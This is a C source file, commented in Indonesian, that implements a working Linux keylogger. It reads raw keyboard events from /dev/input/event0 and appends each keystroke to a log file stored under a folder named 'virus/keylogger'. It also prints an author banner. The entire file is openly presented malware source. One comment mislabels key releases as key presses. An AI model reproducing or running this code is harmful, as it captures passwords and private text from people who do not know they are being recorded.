#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>

#define LOGFILE "/home/xperhide/Documents/project/virus/keylogger/Linux/keyLogger.log"

// Peta karakter berdasarkan kode tombol
char *keymap[] = {
    "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
    "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]",
    "ENTER", "CTRL", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "",
    "SHIFT", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "SHIFT", "*",
    "ALT", "SPACE", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12",
    "POWER", "SCALE", "PAGEDOWN", "PAUSE", "INSERT", "DELETE", "PAGEUP", "END", "COMPOSE", "LEFTMETA",
    "NUMLOCK", "SCROLLLOCK", "KP7", "KP8", "KP9", "KP-", "KP4", "KP5", "KP6", "KP+",
    "KP1", "KP2", "KP3", "KP0", "KP.", "HOME", "COMPOSE", "RIGHTCTRL", "LEFT", "DOWN", "UP", "RIGHT",
    "CALC", "SETUP", "SLEEP", "WAKEUP", "HOMEPAGE", "SCROLLUP", "SCROLLDOWN", "KPLEFTPAREN", "KPRIGHTPAREN"
    // Tambahkan entri lain sesuai kebutuhan
};

int main() {
    struct input_event ev;
    int fd, bytes;
    FILE *fp;

    // Buka file event untuk membaca
    fd = open("/dev/input/event0", O_RDONLY);
    if (fd == -1) {
        perror("Failed to open input event device");
        return EXIT_FAILURE;
    }

    // Buka file log untuk menulis
    fp = fopen(LOGFILE, "a");
    if (fp == NULL) {
        perror("Failed to open log file");
        close(fd);
        return EXIT_FAILURE;
    }

    // Output ASCII art identitas
    printf(
        "██████╗ ███████╗  ██████╗      \n"
        "██╔══██╗██╔════╝ ██╔═══██╗    \n"
        "██████╔╝█████╗   ██╔═══██╝    \n"
        "██╔═══╝ ██╔══╝   ███████      \n"
        "██║     ███████╗ ███  ███     \n"
        "╚═╝     ╚══════╝ ╚═╝  ╚═╝     \n"
        "Made with ❤️ by Mamanwhide\n"
    );

    // Loop membaca event dan menulis ke file log
    while (1) {
        bytes = read(fd, &ev, sizeof(ev));
        if (bytes == -1) {
            perror("Failed to read input event");
            break;
        } else if (bytes != sizeof(ev)) {
            fprintf(stderr, "Incomplete read\n");
            continue;
        }

        // Hanya tangani event key press (ev.value == 0)
        if (ev.type == EV_KEY) {
            if (ev.value == 0) { // Tombol ditekan
                if (ev.code < sizeof(keymap) / sizeof(keymap[0])) {
                    switch (ev.code) {
                        case 28: // Enter
                            fprintf(fp, "\n");
                            break;
                        case 57: // Space
                            fprintf(fp, " ");
                            break;
                        default:
                            fprintf(fp, "%s", keymap[ev.code]);
                    }
                } else {
                    fprintf(stderr, "Unknown key code: %u\n", ev.code);
                }
                fflush(fp);
            }
        }
    }

    fclose(fp);
    close(fd);
    return EXIT_SUCCESS;
}
